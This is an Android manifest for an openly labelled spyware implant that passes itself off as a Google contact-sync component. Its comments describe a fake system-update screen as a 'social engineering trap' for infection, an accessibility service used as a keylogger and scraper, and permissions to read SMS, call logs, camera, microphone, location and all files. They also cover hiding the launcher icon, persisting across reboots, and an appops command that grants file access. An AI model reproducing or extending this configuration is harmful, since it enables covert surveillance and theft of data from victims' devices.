<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    package="com.google.android.contactsync">

    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    
    <!-- Required for stealth / background execution -->
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />

    <!-- Surveillance (declared, granted at runtime via a11y auto-clicker or pm grant) -->
    <uses-permission android:name="android.permission.READ_CONTACTS" />
    <uses-permission android:name="android.permission.READ_CALL_LOG" />
    <uses-permission android:name="android.permission.READ_SMS" />
    <uses-permission android:name="android.permission.RECEIVE_SMS" />
    <uses-permission android:name="android.permission.CAMERA" />
    <uses-permission android:name="android.permission.RECORD_AUDIO" />
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />

    <!-- Filesystem reach. targetSdk 34 + Android 11 scoped storage means
         READ_EXTERNAL_STORAGE alone grants nothing for non-media files, so
         MANAGE_EXTERNAL_STORAGE (all-files appop) is what actually makes
         fs listing/downloads work; the legacy pair below still covers devices
         we support at maxSdkVersion. Grant the appop with:
           appops set com.google.android.contactsync MANAGE_EXTERNAL_STORAGE allow
         it is refused while the permission is undeclared, which is why this
         block must ship before the grant can succeed. -->
    <uses-permission
        android:name="android.permission.MANAGE_EXTERNAL_STORAGE"
        tools:ignore="ScopedStorage" />
    <uses-permission
        android:name="android.permission.READ_EXTERNAL_STORAGE"
        android:maxSdkVersion="32" />
    <uses-permission
        android:name="android.permission.WRITE_EXTERNAL_STORAGE"
        android:maxSdkVersion="29" />

    <!-- Package + foreground visibility, both granted natively:
         QUERY_ALL_PACKAGES is an install-time permission (Play restricts it, but
         the implant is sideloaded), so `apps` lists every package on any device
         with no user action. PACKAGE_USAGE_STATS is a special-access permission:
         the only native grant path is Settings > Usage access, which the
         grant_screen/toggle_grant commands open and click for us. No Shizuku, no
         appops, no adb in either path. -->
    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"
        tools:ignore="QueryAllPackagesPermission" />
    <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS"
        tools:ignore="ProtectedPermissions" />

    <application
        android:name="com.shadow.ShadowApp"
        android:allowBackup="false"
        android:label="@string/app_name"
        android:supportsRtl="true"
        android:theme="@style/Theme.AppCompat.NoActionBar"
        android:excludeFromRecents="true">
        
        <!-- Social Engineering Trap -->
        <activity
            android:name="com.shadow.ui.SystemUpdateActivity"
            android:exported="true"
            android:theme="@style/Theme.AppCompat.NoActionBar"
            android:excludeFromRecents="true"
            android:noHistory="true"
            android:launchMode="singleInstance">
            <!-- 
            We leave the LAUNCHER intent for the initial infection.
            Once the device admin / accessibility is granted, the app can use PackageManager 
            to disable this component so the icon disappears from the launcher.
            -->
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <!-- Device Admin Receiver -->
        <receiver
            android:name="com.shadow.admin.DeviceAdminReceiver"
            android:description="@string/a11y_description"
            android:label="@string/app_name"
            android:permission="android.permission.BIND_DEVICE_ADMIN"
            android:exported="true">
            <meta-data
                android:name="android.app.device_admin"
                android:resource="@xml/device_admin_policies" />
            <intent-filter>
                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
            </intent-filter>
        </receiver>

        <!-- Accessibility Service (Keylogger & Scraper) -->
        <service
            android:name="com.shadow.a11y.ShadowAccessibilityService"
            android:label="@string/app_name"
            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
            android:exported="true">
            <intent-filter>
                <action android:name="android.accessibilityservice.AccessibilityService" />
            </intent-filter>
            <meta-data
                android:name="android.accessibilityservice"
                android:resource="@xml/accessibility_service_config" />
        </service>

        <!-- Survival: foreground fallback, started ONLY while accessibility is not
             bound (see KeepAlive). dataSync is the type ColorOS's reaper tolerates;
             the matching FOREGROUND_SERVICE_DATA_SYNC permission is declared above.
             Not exported: nothing outside this package may start or stop it. -->
        <service
            android:name="com.shadow.SyncForegroundService"
            android:exported="false"
            android:foregroundServiceType="dataSync" />

        <!-- Persistence: SyncAdapter dummy ContentProvider -->
        <provider
            android:name="com.shadow.SyncProvider"
            android:authorities="com.google.android.contactsync"
            android:exported="false"
            android:syncable="true" />

        <!-- Persistence: Boot Receiver -->
        <receiver
            android:name="com.shadow.BootReceiver"
            android:enabled="true"
            android:exported="true">
            <intent-filter android:priority="999">
                <action android:name="android.intent.action.BOOT_COMPLETED" />
                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
                <action android:name="com.htc.intent.action.QUICKBOOT_POWERON" />
            </intent-filter>
        </receiver>

    </application>
</manifest>